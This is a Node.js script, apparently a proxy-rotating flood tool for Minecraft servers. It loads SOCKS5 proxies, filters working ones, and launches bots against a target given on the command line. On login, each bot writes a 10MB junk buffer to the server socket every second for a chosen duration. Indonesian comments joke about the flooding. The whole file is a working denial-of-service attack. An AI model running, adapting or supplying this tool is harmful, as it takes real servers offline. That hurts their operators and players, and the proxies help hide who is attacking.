const mineflayer = require('mineflayer');
const ProxyAgent = require('proxy-agent');
const fs = require('fs');
const net = require('net');

const proxyFile = 'proxy.txt';
const serverHost = process.argv[2];
const serverPort = parseInt(process.argv[3]);
const botCount = 100;
const timeout = 250;
const floodDuration = parseInt(process.argv[4]) * 1000;
const threads = botCount;
const floodBuffer = Buffer.alloc(10 * 1024 * 1024, '!'); // 10MB buffer ya mek

function loadProxies() {
  return fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);
}

async function checkProxy(proxy) {
  const [host, port] = proxy.split(':');
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);

    socket.on('connect', () => {
      socket.destroy();
      resolve(proxy);
    });

    socket.on('timeout', () => {
      socket.destroy();
      resolve(null);
    });

    socket.on('error', () => {
      socket.destroy();
      resolve(null);
    });

    socket.connect(port, host);
  });
}

function createBot(index, proxy) {
  const bot = mineflayer.createBot({
    host: serverHost,
    port: serverPort,
    username: `PermenMD_${index}`,
    agent: new ProxyAgent(`socks5://${proxy}`)
  });

  bot.on('login', () => {
    console.log(`Bot${index} has logged in`);

    // Kirim buffer besar ke server setiap 1 detik
    const floodInterval = setInterval(() => {
      if (bot._client?.socket?.writable) {
        try {
          bot._client.socket.write(floodBuffer);
        } catch (e) {
          console.log(`Bot${index} write error: ${e.message}`);
        }
      }
    }, 1000); // kirim 10MB per detik ya adik adik

    // Hentikan flood setelah durasi berakhir di!z lol
    setTimeout(() => {
      clearInterval(floodInterval);
      bot.quit();
    }, floodDuration);
  });

  bot.on('error', (err) => {
    if (!['ETIMEDOUT', 'ECONNRESET', 'ECONNREFUSED'].includes(err.code)) {
      console.log(`Bot${index} encountered an error: ${err}`);
    }
  });

  bot.on('end', () => {
    console.log(`Bot${index} has disconnected`);
  });
}

async function runBots() {
  const proxies = loadProxies();
  const validProxies = [];

  for (const proxy of proxies) {
    const validProxy = await checkProxy(proxy);
    if (validProxy) validProxies.push(validProxy);
    if (validProxies.length >= botCount) break;
  }

  if (validProxies.length < botCount) {
    console.log('Not enough valid proxies found.');
    return;
  }

  const startTime = Date.now();

  for (let i = 0; i < threads; i++) {
    (function floodThread() {
      if (Date.now() - startTime < floodDuration) {
        createBot(i + 1, validProxies[i]);

        setTimeout(floodThread, 100); // ini delaynya 
      }
    })();
  }

  console.log('Flooding initiated.');
}

runBots();